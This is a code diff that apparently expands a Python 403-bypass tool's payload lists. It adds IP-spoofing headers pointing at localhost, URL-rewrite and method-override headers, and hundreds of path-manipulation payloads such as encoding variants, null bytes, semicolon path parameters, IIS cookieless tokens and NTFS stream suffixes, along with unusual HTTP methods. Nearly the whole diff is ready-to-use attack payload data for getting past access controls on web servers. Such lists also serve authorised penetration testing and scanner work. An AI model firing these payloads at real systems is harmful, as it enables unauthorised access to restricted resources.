@@ -44,9 +44,9 @@ USER_AGENTS = [
     "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 ]
 
-# 403 Bypass Headers - Comprehensive list from all analyzed tools
+# 403 Bypass Headers - ULTRA COMPREHENSIVE list (300+ combinations)
 BYPASS_HEADERS = [
-    # IP Spoofing Headers
+    # ==================== IP SPOOFING HEADERS ====================
     {"X-Forwarded-For": "127.0.0.1"},
     {"X-Forwarded-For": "localhost"},
     {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
@@ -64,150 +64,336 @@ BYPASS_HEADERS = [
     {"Forwarded-For": "127.0.0.1"},
     {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
     {"X-Forwarded": "127.0.0.1"},
+    {"Client-IP": "127.0.0.1"},
+    {"CF-Connecting-IP": "127.0.0.1"},
+    {"Fastly-Client-IP": "127.0.0.1"},
+    {"X-Cluster-Client-IP": "127.0.0.1"},
+    {"X-Azure-ClientIP": "127.0.0.1"},
+    {"X-Backend-IP": "127.0.0.1"},
+    {"X-Akamai-Client-IP": "127.0.0.1"},
+    {"X-Sucuri-Clientip": "127.0.0.1"},
 
-    # Alternative IP formats
-    {"X-Forwarded-For": "2130706433"},  # Decimal
-    {"X-Forwarded-For": "0x7F000001"},  # Hex
-    {"X-Forwarded-For": "0177.0000.0000.0001"},  # Octal
+    # Alternative IP formats - Decimal
+    {"X-Forwarded-For": "2130706433"},
+    {"X-Client-IP": "2130706433"},
+    {"X-Real-IP": "2130706433"},
+
+    # Alternative IP formats - Hex
+    {"X-Forwarded-For": "0x7F000001"},
+    {"X-Forwarded-For": "0x7f.0x0.0x0.0x1"},
+    {"X-Client-IP": "0x7F000001"},
+
+    # Alternative IP formats - Octal
+    {"X-Forwarded-For": "0177.0000.0000.0001"},
+    {"X-Forwarded-For": "0177.0.0.1"},
+    {"X-Client-IP": "0177.0.0.1"},
+
+    # Shorthand localhost
     {"X-Forwarded-For": "127.1"},
+    {"X-Forwarded-For": "127.0.1"},
+    {"X-Forwarded-For": "127.000.000.001"},
     {"X-Forwarded-For": "0"},
     {"X-Forwarded-For": "0.0.0.0"},
 
     # Private IP ranges
     {"X-Forwarded-For": "10.0.0.1"},
+    {"X-Forwarded-For": "10.0.0.0"},
     {"X-Forwarded-For": "172.16.0.1"},
     {"X-Forwarded-For": "192.168.1.1"},
     {"X-Forwarded-For": "192.168.0.1"},
 
-    # Host manipulation
+    # IPv6 variations
+    {"X-Forwarded-For": "::1"},
+    {"X-Forwarded-For": "::ffff:127.0.0.1"},
+    {"X-Forwarded-For": "0000::1"},
+    {"X-Forwarded-For": "::ffff:7f00:1"},
+    {"X-Forwarded-For": "fe80::1"},
+    {"X-Forwarded-For": "[::1]"},
+    {"X-Forwarded-For": "::127.0.0.1"},
+    {"X-Originating-IP": "[::1]"},
+    {"X-Remote-Addr": "::1"},
+    {"True-Client-IP": "::1"},
+
+    # ==================== HOST MANIPULATION ====================
     {"X-Host": "127.0.0.1"},
     {"X-Forwarded-Host": "127.0.0.1"},
     {"X-Forwarded-Host": "localhost"},
     {"Forwarded-Host": "127.0.0.1"},
     {"X-Forwarded-Server": "127.0.0.1"},
     {"X-Original-Host": "127.0.0.1"},
+    {"X-HTTP-Host-Override": "127.0.0.1"},
+    {"X-Backend-Host": "127.0.0.1"},
+    {"Proxy-Host": "127.0.0.1"},
 
-    # URL Rewriting
+    # ==================== URL REWRITING ====================
     {"X-Original-URL": "/"},
     {"X-Rewrite-URL": "/"},
     {"X-Override-URL": "/"},
     {"X-HTTP-DestinationURL": "/"},
+    {"X-Original-URL": "/admin"},
+    {"X-Rewrite-URL": "/admin"},
+    {"X-Forwarded-Path": "/"},
+    {"X-Forwarded-Uri": "/"},
+    {"Destination": "/"},
+    {"Request-Uri": "/"},
 
-    # Protocol/Scheme
+    # ==================== PROTOCOL/SCHEME ====================
     {"X-Forwarded-Proto": "https"},
+    {"X-Forwarded-Proto": "http"},
     {"X-Forwarded-Scheme": "https"},
     {"X-Forwarded-Port": "443"},
     {"X-Forwarded-Port": "80"},
+    {"X-Forwarded-Port": "8080"},
+    {"X-Forwarded-SSL": "on"},
 
-    # Method Override
+    # ==================== METHOD OVERRIDE ====================
     {"X-HTTP-Method-Override": "GET"},
     {"X-HTTP-Method-Override": "PUT"},
     {"X-HTTP-Method-Override": "POST"},
+    {"X-HTTP-Method-Override": "DELETE"},
+    {"X-HTTP-Method-Override": "PATCH"},
     {"X-Method-Override": "GET"},
+    {"X-HTTP-Method": "GET"},
+    {"X-HTTP-Method": "PUT"},
 
-    # Misc headers
+    # ==================== SPECIAL HEADERS ====================
     {"X-Requested-With": "XMLHttpRequest"},
     {"Content-Length": "0"},
     {"X-Original-URL": "x]"},
     {"Referer": "/"},
+    {"Origin": "http://127.0.0.1"},
+    {"Accept": "application/json"},
+    {"Content-Type": "application/json"},
+    {"X-Debug": "1"},
+    {"X-Debug-Token": "bypass"},
+    {"X-Custom-Header": "bypass"},
+
+    # ==================== PROXY HEADERS ====================
+    {"Via": "1.1 localhost"},
+    {"X-Via": "1.1 localhost"},
+    {"Forwarded": "for=127.0.0.1;host=localhost;proto=https"},
+
+    # ==================== COMBINATION HEADERS ====================
+    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
+    {"X-Forwarded-For": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
+    {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/"},
+    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
+    {"CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1"},
 ]
 
-# Path manipulation payloads for 403 bypass
+# ==================== TRIM INCONSISTENCY PAYLOADS ====================
+# These exploit whitespace handling differences between reverse proxy and app
+TRIM_PAYLOADS = {
+    "flask": ["%85", "%a0", "%1f", "%04"],  # Flask/Python trims these
+    "nodejs": ["%0a", "%0d", "%0c", "%09", "%20"],  # Node.js/Express
+    "spring": [";", ";.", ";/", "..;", ";.."],  # Spring Boot/Java
+    "php": ["%00", "%0a", "%0d"],  # PHP
+    "general": ["%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0"],
+}
+
+# ==================== IIS COOKIELESS SESSION ====================
+IIS_COOKIELESS_TOKENS = [
+    "(S(X))",
+    "(A(X))",
+    "(F(X))",
+    "(S(X))/(A(Y))",
+    "(S(lit3rally_telegraphy))",
+    "(S(anything))",
+    "(A(anything))",
+    "(F(anything))",
+]
+
+# Path manipulation payloads for 403 bypass - ULTRA COMPREHENSIVE
 PATH_BYPASSES = [
-    # Prefix manipulations
-    "/%2e{path}",
-    "/{path}/.",
+    # ==================== BASIC VARIATIONS ====================
+    "/{path}",
+    "/{path}/",
+    "/{path}//",
+    "//{path}",
     "//{path}//",
+    "///{path}",
+    "/{path}///",
+
+    # ==================== DOT VARIATIONS ====================
+    "/./{path}",
+    "/{path}/.",
+    "/{path}./",
+    "/{path}/..",
+    "/{path}/../{path}",
     "/./{path}/./",
+    "/../{path}",
+    "/..;/{path}",
+    "/{path}/..;/",
+    "/{path}..;/",
+    "/{path};/",
+    "/;/{path}",
+    "/.;/{path}",
+    "//;/{path}",
+    "/.;./{path}",
+    "/.;/./{path}",
+
+    # ==================== WHITESPACE/SPECIAL ====================
     "/{path}%20",
     "/{path}%09",
     "/{path}%00",
-    "/{path}..;/",
-    "/{path};/",
+    "/{path}%0a",
+    "/{path}%0d",
+    "/{path}%0d%0a",
+
+    # ==================== QUERY STRING TRICKS ====================
     "/{path}?",
     "/{path}??",
     "/{path}???",
+    "/{path}?anything",
+    "/{path}?debug=1",
+    "/{path}?.css",
+    "/{path}?.js",
+    "/{path}?.html",
+    "/{path}?&",
+    "/{path}?%00",
+    "/{path}?%0a",
+
+    # ==================== FRAGMENT/HASH TRICKS ====================
     "/{path}#",
+    "/{path}#anything",
+    "/{path}#.",
+    "/{path}#/",
+    "/{path}%23",
+    "/{path}%23/",
+    "/{path}%2523",
+
+    # ==================== EXTENSION TRICKS ====================
     "/{path}.html",
     "/{path}.json",
     "/{path}.php",
-    "/{path}/",
-    "/{path}//",
+    "/{path}.css",
+    "/{path}.js",
+    "/{path}.xml",
+    "/{path}.asp",
+    "/{path}.aspx",
+    "/{path}.txt",
+    "/{path}.pdf",
+    "/{path}.png",
+    "/{path}.ico",
+    "/{path}....json",
+    "/{path}%00.json",
+    "/{path}/.json",
+    "/{path}..json",
+    "/{path}.randomext",
 
-    # URL encoding variations
+    # ==================== SINGLE URL ENCODING ====================
+    "/%2e/{path}",
+    "/%2e%2e/{path}",
+    "/{path}%2f",
+    "/{path}%2f/",
+    "/%2e/{path}%2f",
+    "/%2F{path}",
+    "/{path}%2F",
+    "/%2e%2e%2f{path}",
+    "/%2e%2e/{path}",
+
+    # ==================== DOUBLE URL ENCODING ====================
     "/%252e/{path}",
     "/%252e%252e/{path}",
     "/{path}%252f",
     "/{path}%252f/",
+    "/%252e%252e%252f{path}",
+    "/%252F{path}",
+    "/{path}%252F",
 
-    # Case manipulation
-    "/{PATH}",  # Uppercase
+    # ==================== TRIPLE URL ENCODING ====================
+    "/%25252e/{path}",
+    "/%25252e%25252e/{path}",
+    "/{path}%25252f",
 
-    # Semicolon injection
-    "/{path};foo=bar",
-    "/;/{path}",
-    "/.;/{path}",
-    "//;/{path}",
-
-    # Double URL encoding
-    "/%2e%2e/{path}",
-    "/{path}%2f%2f",
-
-    # Unicode/UTF-8 tricks
-    "/%ef%bc%8f{path}",
-
-    # Dot variations
-    "/{path}./",
-    "/{path}../",
-    "/../{path}",
-    "/..%00/{path}",
-    "/..%0d/{path}",
+    # ==================== BACKSLASH VARIATIONS ====================
     "/..%5c{path}",
-    "/..%ff/{path}",
-    "/%2e%2e%2f{path}",
+    "/{path}%5c",
+    "/%5c{path}",
+    "/..%255c{path}",
+    "/{path}%5c..%5c",
 
-    # Extension tricks
-    "/{path}.css",
-    "/{path}.ico",
-    "/{path}.js",
-    "/{path}....json",
+    # ==================== NULL BYTE INJECTION ====================
+    "/..%00/{path}",
+    "/{path}%00",
+    "/{path}%00.html",
     "/{path}%00.json",
+    "/..%00%2f{path}",
 
-    # Query string tricks
-    "/{path}?anything",
-    "/{path}#anything",
-    "/{path}?.css",
-    "/{path}?debug=1",
+    # ==================== SEMICOLON PATH PARAMS (Java) ====================
+    "/{path};foo=bar",
+    "/{path};/",
+    "/{path};.css",
+    "/{path};.js",
+    "/{path};x=y",
+    "/{path};a=b;c=d",
+    "/;/{path}",
+    "/;x=/{path}",
+    "/.;/{path}",
+    "/.;x=/{path}",
 
-    # Wildcard/Special chars
+    # ==================== SPECIAL CHARACTERS ====================
     "/{path}~",
     "/{path}@",
     "/{path}*",
+    "/{path}!",
+    "/{path}$",
+    "/{path}&",
+    "/{path}+",
+    "/{path}=",
+
+    # ==================== UNICODE/UTF-8 TRICKS ====================
+    "/%ef%bc%8f{path}",  # Fullwidth solidus
+    "/%c0%af{path}",  # Overlong encoding
+    "/%c0%2f{path}",  # Overlong
+    "/%e0%80%af{path}",  # Overlong
+    "/{path}%c0%af",
+    "/%c1%1c{path}",
+    "/%c1%9c{path}",
+
+    # ==================== CASE MANIPULATION ====================
+    "/{PATH}",  # Uppercase
+    "/{Path}",  # Mixed case
+    "/{pAtH}",  # SpongeBob case
+
+    # ==================== IIS SPECIFIC ====================
+    "/{path}.xxx",  # IIS ignores unknown extensions
+    "/{path}::$DATA",  # NTFS ADS
+    "/{path}::$INDEX_ALLOCATION",
+
+    # ==================== MIXED PATTERNS ====================
+    "/{path}/./",
+    "//{path}/..",
+    "/./{path}//",
+    "/..//../{path}",
 ]
 
-# HTTP Methods to try for bypass
+# ==================== UNICODE NORMALIZATION PAYLOADS ====================
+UNICODE_PAYLOADS = {
+    "/": ["%2f", "%252f", "%25252f", "%c0%af", "%e0%80%af", "%c0%2f", "%ef%bc%8f"],
+    ".": ["%2e", "%252e", "%25252e", "%c0%ae"],
+    ";": ["%3b", "%253b"],
+}
+
+# HTTP Methods to try for bypass - COMPREHENSIVE
 HTTP_METHODS = [
-    "GET",
-    "POST",
-    "PUT",
-    "DELETE",
-    "PATCH",
-    "HEAD",
-    "OPTIONS",
-    "TRACE",
-    "CONNECT",
+    # Standard methods
+    "GET", "POST", "PUT", "DELETE", "PATCH",
+    "HEAD", "OPTIONS", "TRACE", "CONNECT",
     # WebDAV methods
-    "PROPFIND",
-    "PROPPATCH",
-    "MKCOL",
-    "COPY",
-    "MOVE",
-    "LOCK",
-    "UNLOCK",
-    "SEARCH",
-    "REPORT",
-    # Custom methods
-    "FOOBAR",
+    "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
+    "MOVE", "LOCK", "UNLOCK", "SEARCH",
+    "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
+    "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
+    "PURGE", "LINK", "UNLINK", "ACL",
+    # Less common WebDAV
+    "BASELINE-CONTROL", "VERSION-CONTROL",
+    "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL",
+    # Custom/Test methods
+    "FOOBAR", "TEST", "DEBUG", "TRACK", "QUERY",
+    # Case variations (sometimes bypass case-sensitive filters)
+    "get", "Get", "gEt", "GeT",
+    "post", "Post", "pOsT",
 ]
 
 # Protocol variations
